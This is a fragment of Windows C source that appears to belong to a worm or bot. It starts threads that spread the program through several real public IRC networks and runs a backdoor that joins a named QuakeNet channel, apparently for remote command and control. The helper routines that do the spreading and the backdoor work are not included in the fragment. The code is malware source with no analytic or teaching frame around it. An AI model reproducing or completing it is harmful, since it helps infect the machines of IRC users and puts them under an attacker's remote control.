   DWORD WINAPI EfnetSpread(LPVOID)
   {
       IrcSpread("irc.efnet.org");
       return 0;
   }

   DWORD WINAPI UndernetSpread(LPVOID)
   {
       if(RandomNumber(2) == 0)
       {
           IrcSpread("eu.undernet.org");
       }
       else
       {
           IrcSpread("us.undernet.org");
       }

       return 0;
   }

   DWORD WINAPI DalnetSpread(LPVOID)
   {
       IrcSpread("irc.dal.net");
       return 0;
   }

   DWORD WINAPI RizonSpread(LPVOID)
   {
       IrcSpread("irc.rizon.net");
       return 0;
   }

   DWORD WINAPI IrcnetSpread(LPVOID)
   {
       if(RandomNumber(2) == 0)
       {
           if(RandomNumber(2) == 0)
           {
               IrcSpread("random.ircd.de");
           }
           else
           {
               IrcSpread("irc.us.ircnet.net");
           }
       }
       else
       {
           if(RandomNumber(2) == 0)
           {
               IrcSpread("irc.fr.ircnet.net");
           }
           else
           {
               IrcSpread("irc.ircnet.ee");
           }
       }

       return 0;
   }

   DWORD WINAPI QuakenetSpread(LPVOID)
   {
       IrcSpread("irc.quakenet.org");
       return 0;
   }

   DWORD WINAPI IrcBackdoorRun(LPVOID)
   {
       IrcBackdoor("irc.quakenet.org", "#tamiami", "strangler");
       return 0;
   }

   HANDLE EfnetHandle;
   HANDLE UndernetHandle;
   HANDLE DalnetHandle;
   HANDLE RizonHandle;
   HANDLE IrcnetHandle;
   HANDLE QuakenetHandle;

   void IrcThreads(void)
   {
       char    IPBuffer[100];

       if(GetIP(IPBuffer) == true)
       {
           EfnetHandle     = CreateThread(0, 0, EfnetSpread, 0, 0, 0);
           UndernetHandle  = CreateThread(0, 0, UndernetSpread, 0, 0, 0);
           DalnetHandle    = CreateThread(0, 0, DalnetSpread, 0, 0, 0);
           RizonHandle     = CreateThread(0, 0, RizonSpread, 0, 0, 0);
           IrcnetHandle    = CreateThread(0, 0, IrcnetSpread, 0, 0, 0);
           QuakenetHandle  = CreateThread(0, 0, QuakenetSpread, 0, 0, 0);
       }

       return;
   }

   void TerminateIrcThreads(void)
   {
       TerminateThread(EfnetHandle, 0);
       TerminateThread(UndernetHandle, 0);
       TerminateThread(DalnetHandle, 0);
       TerminateThread(RizonHandle, 0);
       TerminateThread(IrcnetHandle, 0);
       TerminateThread(QuakenetHandle, 0);

       return;
   }
